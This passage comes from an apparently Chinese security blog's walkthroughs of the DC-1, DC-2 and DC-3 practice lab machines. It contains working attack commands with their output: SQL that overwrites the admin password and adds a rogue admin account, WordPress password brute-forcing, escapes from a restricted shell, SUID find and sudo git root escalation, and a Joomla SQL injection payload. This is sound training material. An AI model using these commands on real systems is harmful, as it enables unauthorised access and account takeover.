class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>发现mysql 连接不上，命令不可以使用</p>
<p><img data-src="./DC-1/9.png" alt></p>
<h3 id="切换shell"><a href="#切换shell" class="headerlink" title="切换shell"></a>切换shell</h3><ul>
<li>meterpreter <code>shell</code>切换外壳</li>
<li>python 起一个交互shell </li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c  <span class="string">"import pty; pty.spawn('/bin/bash')"</span> </span><br><span class="line">python3 -c  <span class="string">"import pty; pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-1/10.png" alt></p>
<p>连接数据库<code>mysql -udbuser -pR0ck3t</code></p>
<p>发现admin密码</p>
<p><img data-src="./DC-1/11.png" alt></p>
<p>用脚本获取密码 hash 值 <code>$S$Dbtas6IBA6zZy3/gFmJJXcW7i5t.yesrLAMlpCrfDE4OHpq34lix</code></p>
<p><img data-src="./DC-1/12.png" alt></p>
<p>备注：这里可以也修改登录逻辑 or 利用其它漏洞增加另一个用户</p>
<p>更新数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update users set pass&#x3D;&quot;$S$Dbtas6IBA6zZy3&#x2F;gFmJJXcW7i5t.yesrLAMlpCrfDE4OHpq34lix&quot; where name&#x3D;&quot;admin&quot;</span><br><span class="line"></span><br><span class="line">insert into users (uid, name, pass,mail,signature_format,status,data) values (7, &quot;admin4&quot;,&quot;$S$Dbtas6IBA6zZy3&#x2F;gFmJJXcW7i5t.yesrLAMlpCrfDE4OHpq34lix&quot;, &quot;admin2@123.com&quot;,NULL,1,&quot;b:0;&quot;);</span><br><span class="line"></span><br><span class="line">TRUNCATE TABLE &#96;flood&#96;; # 锁 ip 锁账号</span><br></pre></td></tr></table></figure>

<p>登录后台 拿到flag3</p>
<p><img data-src="./DC-1/13.png" alt></p>
<h3 id="提权，进入-root"><a href="#提权，进入-root" class="headerlink" title="提权，进入/root"></a>提权，进入/root</h3><p>suid?</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-1/14.png" alt></p>
<p>运用find提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /var/www/1.txt -exec whoami \;</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-1/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 最后的flag</span></span><br><span class="line">find /var/www/1.txt -exec ls /root \;</span><br><span class="line"></span><br><span class="line">find /var/www/1.txt -exec cat /root/thefinalflag.txt \;</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-1/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2</title>
    <url>/2021/01/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-2/</url>
    <content><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-2 5flags</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:02:ae, IPv4: 192.168.43.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 2)</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.43.228  08:00:27:d1:57:8d       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.032 seconds (125.98 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li><p>目标为 192.168.43.228</p>
</li>
<li><p>NMAP</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.228</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 04:59 EST</span><br><span class="line">Nmap scan report for 192.168.43.228</span><br><span class="line">Host is up (0.00036s latency).                                                                                                                                                                                    </span><br><span class="line">Not shown: 65533 closed ports                                                                                                                                                                                     </span><br><span class="line">PORT     STATE SERVICE VERSION                                                                                                                                                                                    </span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                                                             </span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                                                      </span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/                                                                                                                                                             </span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)                                                                                                                                                </span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)                                                                                                                                               </span><br><span class="line">| ssh-hostkey:                                                                                                                                                                                                    </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)                                                                                                                                                    </span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)                                                                                                                                                    </span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 08:00:27:D1:57:8D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.36 ms 192.168.43.228</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li><p>开放 80 7744 两个端口</p>
</li>
<li><p>目录扫描</p>
</li>
</ul>
<p><img data-src="./DC-2/1.png" alt></p>
<h3 id="访问端口"><a href="#访问端口" class="headerlink" title="访问端口"></a>访问端口</h3><p><img data-src="./DC-2/2.png" alt></p>
<ul>
<li>配置<code>host</code>后访问</li>
</ul>
<p><img data-src="./DC-2/3.png" alt></p>
<p>这里发现后台为 <code>wordpress</code> ,提醒我们用<code>cewl</code>密码工具</p>
<h3 id="cewl-amp-wp-scan"><a href="#cewl-amp-wp-scan" class="headerlink" title="cewl&amp;wp-scan"></a>cewl&amp;wp-scan</h3><p>​    根据提示<code>cewl</code>和<code>wp-scan</code>，扫一波看看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cewl 生成字典</span></span><br><span class="line">cewl http://dc-2/ -w dc2_dict.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:~# cewl http://dc-2/ -w dc2_dict.txt</span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@kali:~# cat dc2_dict.txt </span><br><span class="line">sit</span><br><span class="line">amet</span><br><span class="line">nec</span><br><span class="line">quis</span><br><span class="line">vel</span><br><span class="line">orci</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>​    拿到了一个字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wp-scan 扫描站点</span></span><br><span class="line">wpscan --url http://dc-2/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] URL: http://dc-2/ [192.168.43.228]</span><br><span class="line">[+] Started: Sat Jan  2 05:31:09 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://dc-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2020-12-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.5</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (22 / 22) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Jan  2 05:31:13 2021</span><br><span class="line">[+] Requests Done: 52</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 10.428 KB</span><br><span class="line">[+] Data Received: 287.834 KB</span><br><span class="line">[+] Memory used: 205.801 MB</span><br><span class="line">[+] Elapsed time: 00:00:04</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 枚举用户名</span></span><br><span class="line">wpscan --url http://dc-2/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 爆破密码 admin jerry jerry</span></span><br><span class="line">wpscan --url http://dc-2/ --passwords ./dc2_dict.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">[SUCCESS] - jerry / adipiscing                                                                                                                                                                                    </span><br><span class="line">[SUCCESS] - tom / parturient                                                                                                                                                                                      </span><br><span class="line">Trying admin / flag Time: 00:01:32 &lt;==========================================================================================================================================&gt; (645 / 645) 100.00% Time: 00:01:32</span><br><span class="line">Trying admin / log Time: 00:01:32 &lt;===========================================================================================================================================&gt; (645 / 645) 100.00% Time: 00:01:32</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>

<p>账号密码: jerry/adipiscing   tom/parturient</p>
<p>登录账号查看</p>
<p><img data-src="./DC-2/4.png" alt></p>
<h3 id="SSH后台-7744端口"><a href="#SSH后台-7744端口" class="headerlink" title="SSH后台(7744端口)"></a>SSH后台(7744端口)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# ssh tom@192.168.43.228 -p 7744</span><br><span class="line">The authenticity of host '[192.168.43.228]:7744 ([192.168.43.228]:7744)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ZbyT03GNDQgEmA5AMiTX2N685NTzZuOoyMDIA+DW1qU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added '[192.168.43.228]:7744' (ECDSA) to the list of known hosts.</span><br><span class="line">tom@192.168.43.228's password:</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">tom@DC-2:~$ id</span><br><span class="line">-rbash: id: command not found</span><br><span class="line">tom@DC-2:~$</span><br></pre></td></tr></table></figure>

<ul>
<li>这里拿到一个受限的<code>shell</code></li>
<li>脱离<code>rbash</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-2/5.png" alt></p>
<ul>
<li>为了方便这里起一个交互<code>shell</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-2/6.png" alt></p>
<ul>
<li>切换用户</li>
</ul>
<p>jerry目录下存在 flag4</p>
<p><img data-src="./DC-2/7.png" alt></p>
<ul>
<li>提权</li>
</ul>
<p><img data-src="./DC-2/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br><span class="line">! 'sh'</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-2/9.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2021/01/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-3/</url>
    <content><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-3 1 flag</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:02:ae, IPv4: 192.168.43.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 2)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 3)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered) (DUP: 4)</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 2)</span><br><span class="line">192.168.43.182  08:00:27:51:4f:e7       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 3)</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">9 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 9 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.182</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.182</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 08:35 EST</span><br><span class="line">Nmap scan report for 192.168.43.182</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 08:00:27:51:4F:E7 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 192.168.43.182</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-3/1.png" alt></p>
<h3 id="joomscan"><a href="#joomscan" class="headerlink" title="joomscan"></a>joomscan</h3><p>发现是<code>joomla</code>,扫一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">joomscan -u http://192.168.43.182/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">rocessing http://192.168.43.182/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.43.182/administrator/components</span><br><span class="line">http://192.168.43.182/administrator/modules</span><br><span class="line">http://192.168.43.182/administrator/templates</span><br><span class="line">http://192.168.43.182/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.43.182/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common log files name</span><br><span class="line">[++] error log is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found                                                                                                                                                                                                                                                      </span><br><span class="line">Your Report : reports/192.168.43.182/</span><br></pre></td></tr></table></figure>

<p>这个时候拿到版本号为 3.7.0，搜索开源漏洞CVE-2017-8917，进行sql注入(报错注入)</p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-3/2.png" alt></p>
<ul>
<li>sqlmap</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.182&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;&quot; -p list[fullordering] --risk 3 --level 3</span><br></pre></td></tr></table></figure>

<ul>
<li>数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 数据库</span></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 表</span></span><br><span class="line">Database: joomladb</span><br><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      